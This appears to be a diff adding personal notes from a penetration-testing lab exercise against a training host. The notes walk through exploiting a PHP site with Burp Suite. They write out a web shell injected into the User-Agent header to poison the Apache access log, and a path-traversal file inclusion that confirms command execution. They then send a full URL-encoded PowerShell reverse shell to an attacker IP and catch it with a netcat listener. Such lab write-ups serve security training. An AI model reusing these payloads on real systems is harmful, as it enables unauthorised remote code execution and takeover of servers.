@@ -1,0 +1,53 @@
+Update the /etc/hosts file with the new web server IP:
+┌──(kali㉿kali)-[~]
+└─$ tail /etc/hosts
+127.0.0.1       localhost
+127.0.1.1       kali
+::1             localhost ip6-localhost ip6-loopback
+ff02::1         ip6-allnodes
+ff02::2         ip6-allrouters
+127.0.0.1       internalsrv1.beyond.com
+192.168.239.247 web02.relia.com
+192.168.182.147 MS01.oscp.exam
+192.168.231.16 offsecwp
+192.168.231.193   mountaindesserts.com
+
+Set the Firefox Proxy Settings
+
+Started Burp Suite
+
+Connected to the website:
+┌──(kali㉿kali)-[~]
+└─$ firefox http://mountaindesserts.com/meteor
+
+Click on "Admin" on the bottom of the page
+
+Selected the request in Burp HTTP History and sent it to Repeater:
+
+Appended a web shell to the User Agent header and sent the request in Burp:
+GET /meteor/index.php?page=admin.php HTTP/1.1
+Host: mountaindesserts.com
+User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://mountaindesserts.com/meteor/
+Upgrade-Insecure-Requests: 1
+
+
+Confirmed RCE:
+GET /meteor/index.php?page=../../../../../../../../../../xampp\apache\logs\access.log&cmd=dir HTTP/1.1
+
+Encoded a one-liner PowerShell reverse shell command:
+GET /meteor/index.php?page=../../../../../../../../../../xampp\apache\logs\access.log&cmd=powershell+-nop+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.45.228',4444)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2++%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()" HTTP/1.1
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.228] from (UNKNOWN) [192.168.169.193] 62334
+pwd
+Path                  
+----                  
+C:\xampp\htdocs\meteor
